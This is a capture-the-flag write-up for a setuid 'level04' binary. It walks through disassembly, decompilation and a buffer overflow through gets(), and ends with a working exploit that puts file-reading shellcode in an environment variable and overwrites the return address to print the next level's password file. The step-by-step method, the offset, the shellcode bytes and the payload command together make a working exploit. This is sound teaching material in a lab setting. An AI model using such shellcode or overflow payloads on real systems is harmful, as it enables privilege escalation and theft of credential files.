What do we have?

	$ ll 
	total 17
	dr-xr-x---+ 1 level04 level04   80 Sep 13  2016 ./
	dr-x--x--x  1 root    root     260 Oct  2  2016 ../
	-rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04*
	-rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
	-rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile

A `level04` binary. Let's check the assembly:

	$ gdb ./level04
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x080486c8 <+0>:     push   %ebp
	0x080486c9 <+1>:     mov    %esp,%ebp
	0x080486cb <+3>:     push   %edi
	0x080486cc <+4>:     push   %ebx
	=> 0x080486cd <+5>:     and    $0xfffffff0,%esp
	0x080486d0 <+8>:     sub    $0xb0,%esp
	0x080486d6 <+14>:    call   0x8048550 <fork@plt>
	0x080486db <+19>:    mov    %eax,0xac(%esp)
	0x080486e2 <+26>:    lea    0x20(%esp),%ebx
	0x080486e6 <+30>:    mov    $0x0,%eax
	0x080486eb <+35>:    mov    $0x20,%edx
	0x080486f0 <+40>:    mov    %ebx,%edi
	0x080486f2 <+42>:    mov    %edx,%ecx
	0x080486f4 <+44>:    rep stos %eax,%es:(%edi)
	0x080486f6 <+46>:    movl   $0x0,0xa8(%esp)
	0x08048701 <+57>:    movl   $0x0,0x1c(%esp)
	0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
	0x08048711 <+73>:    jne    0x8048769 <main+161>
	0x08048713 <+75>:    movl   $0x1,0x4(%esp)
	0x0804871b <+83>:    movl   $0x1,(%esp)
	0x08048722 <+90>:    call   0x8048540 <prctl@plt>
	0x08048727 <+95>:    movl   $0x0,0xc(%esp)
	0x0804872f <+103>:   movl   $0x0,0x8(%esp)
	0x08048737 <+111>:   movl   $0x0,0x4(%esp)
	0x0804873f <+119>:   movl   $0x0,(%esp)
	0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
	0x0804874b <+131>:   movl   $0x8048903,(%esp)
	0x08048752 <+138>:   call   0x8048500 <puts@plt>
	0x08048757 <+143>:   lea    0x20(%esp),%eax
	0x0804875b <+147>:   mov    %eax,(%esp)
	0x0804875e <+150>:   call   0x80484b0 <gets@plt>
	0x08048763 <+155>:   jmp    0x804881a <main+338>
	0x08048768 <+160>:   nop
	0x08048769 <+161>:   lea    0x1c(%esp),%eax
	0x0804876d <+165>:   mov    %eax,(%esp)
	0x08048770 <+168>:   call   0x80484f0 <wait@plt>
	0x08048775 <+173>:   mov    0x1c(%esp),%eax
	0x08048779 <+177>:   mov    %eax,0xa0(%esp)
	0x08048780 <+184>:   mov    0xa0(%esp),%eax
	0x08048787 <+191>:   and    $0x7f,%eax
	0x0804878a <+194>:   test   %eax,%eax
	0x0804878c <+196>:   je     0x80487ac <main+228>
	0x0804878e <+198>:   mov    0x1c(%esp),%eax
	0x08048792 <+202>:   mov    %eax,0xa4(%esp)
	0x08048799 <+209>:   mov    0xa4(%esp),%eax
	0x080487a0 <+216>:   and    $0x7f,%eax
	0x080487a3 <+219>:   add    $0x1,%eax
	0x080487a6 <+222>:   sar    %al
	0x080487a8 <+224>:   test   %al,%al
	0x080487aa <+226>:   jle    0x80487ba <main+242>
	0x080487ac <+228>:   movl   $0x804891d,(%esp)
	0x080487b3 <+235>:   call   0x8048500 <puts@plt>
	0x080487b8 <+240>:   jmp    0x804881a <main+338>
	0x080487ba <+242>:   movl   $0x0,0xc(%esp)
	0x080487c2 <+250>:   movl   $0x2c,0x8(%esp)
	0x080487ca <+258>:   mov    0xac(%esp),%eax
	0x080487d1 <+265>:   mov    %eax,0x4(%esp)
	0x080487d5 <+269>:   movl   $0x3,(%esp)
	0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
	0x080487e1 <+281>:   mov    %eax,0xa8(%esp)
	0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)
	0x080487f0 <+296>:   jne    0x8048768 <main+160>
	0x080487f6 <+302>:   movl   $0x8048931,(%esp)
	0x080487fd <+309>:   call   0x8048500 <puts@plt>
	0x08048802 <+314>:   movl   $0x9,0x4(%esp)
	0x0804880a <+322>:   mov    0xac(%esp),%eax
	0x08048811 <+329>:   mov    %eax,(%esp)
	0x08048814 <+332>:   call   0x8048520 <kill@plt>
	0x08048819 <+337>:   nop
	0x0804881a <+338>:   mov    $0x0,%eax
	0x0804881f <+343>:   lea    -0x8(%ebp),%esp
	0x08048822 <+346>:   pop    %ebx
	0x08048823 <+347>:   pop    %edi
	0x08048824 <+348>:   pop    %ebp
	0x08048825 <+349>:   ret
	End of assembler dump.

	(gdb) info functions
	[...]
	0x08048634  clear_stdin
	0x08048657  get_unum
	0x0804868f  prog_timeout
	0x080486a0  enable_timeout_cons

	(gdb) disas clear_stdin
	Dump of assembler code for function clear_stdin:
	0x08048634 <+0>:     push   %ebp
	0x08048635 <+1>:     mov    %esp,%ebp
	0x08048637 <+3>:     sub    $0x18,%esp
	0x0804863a <+6>:     movb   $0x0,-0x9(%ebp)
	0x0804863e <+10>:    jmp    0x8048641 <clear_stdin+13>
	0x08048640 <+12>:    nop
	0x08048641 <+13>:    call   0x80484c0 <getchar@plt>
	0x08048646 <+18>:    mov    %al,-0x9(%ebp)
	0x08048649 <+21>:    cmpb   $0xa,-0x9(%ebp)
	0x0804864d <+25>:    je     0x8048655 <clear_stdin+33>
	0x0804864f <+27>:    cmpb   $0xff,-0x9(%ebp)
	0x08048653 <+31>:    jne    0x8048640 <clear_stdin+12>
	0x08048655 <+33>:    leave
	0x08048656 <+34>:    ret
	End of assembler dump.

	(gdb) disas get_unum
	Dump of assembler code for function get_unum:
	0x08048657 <+0>:     push   %ebp
	0x08048658 <+1>:     mov    %esp,%ebp
	0x0804865a <+3>:     sub    $0x28,%esp
	0x0804865d <+6>:     movl   $0x0,-0xc(%ebp)
	0x08048664 <+13>:    mov    0x804a040,%eax
	0x08048669 <+18>:    mov    %eax,(%esp)
	0x0804866c <+21>:    call   0x80484a0 <fflush@plt>
	0x08048671 <+26>:    mov    $0x8048900,%eax
	0x08048676 <+31>:    lea    -0xc(%ebp),%edx
	0x08048679 <+34>:    mov    %edx,0x4(%esp)
	0x0804867d <+38>:    mov    %eax,(%esp)
	0x08048680 <+41>:    call   0x8048560 <__isoc99_scanf@plt>
	0x08048685 <+46>:    call   0x8048634 <clear_stdin>
	0x0804868a <+51>:    mov    -0xc(%ebp),%eax
	0x0804868d <+54>:    leave
	0x0804868e <+55>:    ret
	End of assembler dump.

	(gdb) disas prog_timeout
	Dump of assembler code for function prog_timeout:
	0x0804868f <+0>:     push   %ebp
	0x08048690 <+1>:     mov    %esp,%ebp
	0x08048692 <+3>:     mov    $0x1,%eax
	0x08048697 <+8>:     mov    $0x1,%ebx
	0x0804869c <+13>:    int    $0x80
	0x0804869e <+15>:    pop    %ebp
	0x0804869f <+16>:    ret
	End of assembler dump.

	(gdb) disas enable_timeout_cons
	Dump of assembler code for function enable_timeout_cons:
	0x080486a0 <+0>:     push   %ebp
	0x080486a1 <+1>:     mov    %esp,%ebp
	0x080486a3 <+3>:     sub    $0x18,%esp
	0x080486a6 <+6>:     movl   $0x804868f,0x4(%esp)
	0x080486ae <+14>:    movl   $0xe,(%esp)
	0x080486b5 <+21>:    call   0x80484d0 <signal@plt>
	0x080486ba <+26>:    movl   $0x3c,(%esp)
	0x080486c1 <+33>:    call   0x80484e0 <alarm@plt>
	0x080486c6 <+38>:    leave
	0x080486c7 <+39>:    ret
	End of assembler dump.

Cleaned `Ghidra`:

	void clear_stdin(void)
	{
		int	iVar1;
		
		do
		{
			iVar1 = getchar();
			if ((char)iVar1 == '\n')
				return;
		} while ((char)iVar1 != -1);
		return;
	}

Clear stdin.

	int	get_unum(void)
	{
		unsigned int	local_10;
		
		local_10 = 0;
		fflush(stdout);
		scanf("%u", &local_10);
		clear_stdin();
		return (local_10);
	}

Read a number from the user.

	void	prog_timeout(int signum)
	{
		syscall(SYS_exit, 1);
		return;
	}

Kill the program.

	void	enable_timeout_cons(void)
	{
		signal(14, prog_timeout);
		alarm(60);
		return;
	}

Timeout gestion.

	int	main(void)
	{
		int				iVar1;
		char			*pcVar2;
		char			bVar3;
		unsigned int	local_a4;
		char			local_a0[128];
		unsigned int	local_20;
		unsigned int	local_1c;
		long			local_18;
		int				local_14;
		
		bVar3 = 0;
		local_14 = fork();
		pcVar2 = local_a0;
		for (iVar1 = 128; iVar1 != 0; iVar1--)
		{
			pcVar2[0] = '\0';
			pcVar2[1] = '\0';
			pcVar2[2] = '\0';
			pcVar2[3] = '\0';
			pcVar2 += 4;
		}
		local_18 = 0;
		local_a4 = 0;

Fork and init var.

		if (local_14 == 0)
		{
			prctl(1, 1);
			ptrace(PTRACE_TRACEME, 0, 0, 0);
			puts("Give me some shellcode, k");
			gets(local_a0);
		}

In child, ask for shellcode with a `gets`.

		else
		{
			do
			{
				wait(&local_a4);
				local_20 = local_a4;
				if (((local_a4 & 127) == 0) || (local_1c = local_a4, '\0' < (char)(((char)local_a4 & 127) + 1) >> 1))
				{
					puts("child is exiting...");
					return (0);
				}
				local_18 = ptrace(PTRACE_PEEKUSER, local_14, 44, 0);
			} while (local_18 != 11);
			puts("no exec() for you");
			kill(local_14, 9);
		}
		return (0);
	}

In parent `wait`, but if the child make a syscall 11 (`exec` functions), kill the program.

So we have to use shellcode without `exec` in the child. Let's find the offset:

	$ gdb ./level04
	[...]
	(gdb) set follow-fork-mode child
	[...]
	(gdb) r < <(printf 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag')
	[...]
	child is exiting...
	Give me some shellcode, k

	Program received signal SIGSEGV, Segmentation fault.
	[Switching to process 1768]
	0x41326641 in ?? ()

It's 156. From there, we struggled a lot putting a shellcode in the buffer, and rewriting `eip` to its addresses. Somehow, we just couldn't get it to work, so we had to change our approach. We got this shellcode : `\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass` (https://shell-storm.org/shellcode/files/shellcode-73.html), and put it in the env.

	$ export e=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'

Then, we get its address with a short C program.

	$ cd /tmp; nano t.c; cc t.c; chmod 777 ./a.out; ./a.out; cd

	#include <stdlib.h>
	#include <stdio.h>

	int	main(int argc, char **argv)
	{
		printf("%p\n", getenv("e"));
	}

`0x7fffffffeed2` => `0xffffeed2` => `\xd2\xee\xff\xff`. So, 156 fillers + this address containing the shellcode to open and read the file, writing its content to stdout.

	$ (printf 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1\xd2\xde\xff\xff') | ./level04
	Give me some shellcode, k
	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
	child is exiting...

That's not our favorite way to do, but it worked.
